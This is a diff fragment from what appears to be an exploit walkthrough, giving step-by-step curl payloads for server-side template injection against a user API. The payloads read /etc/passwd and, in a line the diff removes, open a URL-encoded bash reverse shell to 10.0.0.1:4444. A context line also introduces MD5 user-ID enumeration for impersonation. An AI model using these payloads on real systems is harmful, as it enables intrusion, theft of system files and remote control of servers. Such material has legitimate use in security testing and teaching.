@@ -165,7 +165,7 @@ curl -X GET "http://target/api/users/$id?name={{7*'7'}}"
 # Step 3: Read /etc/passwd
 curl -X GET "http://target/api/users/$id?name={{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}"
 # Step 4: Get reverse shell (URL encode the payload)
-curl -X GET "http://target/api/users/$id?name=%7B%7B%27%27.__class__.__mro__[1].__subclasses__()[40]%28%27bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261%22%27%29.read%28%29%7D%7D"
+curl -X GET "REDACTED__N24%%__"
 
 MD5 User ID Enumeration (decrypt and impersonate):
 # Step 1: Extract MD5 from user URL
